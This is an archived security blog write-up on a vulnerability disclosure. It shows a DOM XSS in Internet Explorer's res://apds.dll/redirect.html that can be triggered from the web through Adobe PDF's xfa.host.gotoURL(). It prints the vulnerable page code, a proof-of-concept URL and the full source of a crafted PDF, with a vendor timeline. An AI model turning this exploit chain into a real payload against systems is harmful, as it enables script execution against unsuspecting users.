---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-03-19_from-http-domain-to-res-domain-xss-by-using-ie-adobes-pdf-activex-plugin.md
original_filename: 2019-03-19_from-http-domain-to-res-domain-xss-by-using-ie-adobes-pdf-activex-plugin.md
title: From http:// domain to res:// domain xss by using IE Adobe’s PDF ActiveX plugin
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 6dc4cdb91a692c077c450451a4588f10c2f070443f1fd40b4cd708a62f724c64
text_sha256: db2cb34a8eab264e970f7f7d22784a9e537767d598413276c8d2b96cbd707299
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# From http:// domain to res:// domain xss by using IE Adobe’s PDF ActiveX plugin

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-03-19_from-http-domain-to-res-domain-xss-by-using-ie-adobes-pdf-activex-plugin.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `6dc4cdb91a692c077c450451a4588f10c2f070443f1fd40b4cd708a62f724c64`
- Text SHA256: `db2cb34a8eab264e970f7f7d22784a9e537767d598413276c8d2b96cbd707299`


## Content

---
title: "From http:// domain to res:// domain xss by using IE Adobe’s PDF ActiveX plugin"
url: "https://medium.com/@80vul/from-http-domain-to-res-domain-xss-by-using-ie-adobes-pdf-activex-plugin-9f2a72a87aff"
authors: ["Heige (@80vul)"]
programs: ["Microsoft"]
bugs: ["DOM XSS"]
publication_date: "2019-03-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5353
scraped_via: "browseros"
---

# From http:// domain to res:// domain xss by using IE Adobe’s PDF ActiveX plugin

From http:// domain to res:// domain xss by using IE Adobe’s PDF ActiveX plugin
heige
Follow
2 min read
·
Mar 19, 2019

43

by Heige(a.k.a Superhei) of KnownSec 404 Team 03/19/2019

[Article release: https://paper.seebug.org/860/]

1 res://apds.dll/redirect.html dom xss

https://bugs.chromium.org/p/project-zero/issues/detail?id=1598&desc=5 had reported an xss vulnerability in res://apds.dll/redirect.html. And this vulnerability has not been fixed until now.

this vulnerability is a typical dom xss vulnerability form the res://apds.dll/redirect.html code:

<!DOCTYPE html>
<html xmlns=”http://www.w3.org/1999/xhtml" >
<head>
<meta http-equiv=”Content-Type” content=”text/html; charset=utf-8"/>
<script type=”text/javascript”>
var targetParamRegex = /[\?\&]target=([^\&\#]+)/i;
var targetResults = targetParamRegex.exec(window.location.search);
if (targetResults) {
window.location.replace(decodeURIComponent(targetResults[1]));
}
</script>
</head>
<body>
</body>
</html>

POC:

res://apds.dll/redirect.html?target=javascript:alert(1)

2 from http:// domain to res:// domain

Usually accessing res:// resources via http:// domain is not allowed. The Javascript function xfa.host.gotoURL() in Adobe PDF can access multiple URLs include http(s):// file:// etc. Of course, in general, there will be security tips when you open the PDF files.

But when we use xfa.host.gotoURL() to access res:// or http(s):// by IE Adobe’s PDF ActiveX plugin :

xfa.host.gotoURL(“res://apds.dll/redirect.html?target=javascript:alert(1);//”);

Get heige’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

there are no security alerts. and the xss payload “alert(1)” is executed.

POC: http://xxxxxxx/r.pdf

r.pdf code:

%PDF-1.4
1 0 obj
<<>>
%endobj

2 0 obj <<>>
stream
<xdp:xdp xmlns:xdp=”http://ns.adobe.com/xdp/">
<config><present><pdf>
<interactive>1</interactive>
</pdf></present></config>

<template>
<subform name=”a”>
<pageSet/>
</subform>
</template>
</xdp:xdp>
endstream
endobj

trailer
<<
/Root
<<
/Pages <<>>
/AcroForm
<<
/XFA 2 0 R
>>
/OpenAction
<<
/S/JavaScript
/JS(
xfa.host.gotoURL(“res://apds.dll/redirect.html?target=javascript:alert(1);//”);
)
>>
>>
>>

demo tweet https://twitter.com/80vul/status/1048576146835558400

3 fixed?

Due to some security domain isolation of IE, the harm of res:// domain xss is limited. But I think Microsoft should actively fix the res://apds.dll/redirect.html xss vulnerability, and Adobe should disable or give corresponding security warnings when URL redirect,The world can be more beautiful and harmonious!

4 Timeline

October 04, 2018 Report it to Adobe PSIRT and MSRC
October 05, 2018 Adobe tracking number PSIRT-8981.
October 09, 2018 MSRC Case 47932 CRM:0461065793
October 18, 2018 Adobe PSIRT has been investigating and still
November 21, 2018 MSRC have completed our investigation and determined that the case doesn’t meet the bar for immediate servicing in a security update.
March 19, 2019 Public

October 15,2019 Adobe fix it in the APSB19–49 (CVE-2019–8160) https://helpx.adobe.com/security/products/acrobat/apsb19-49.html
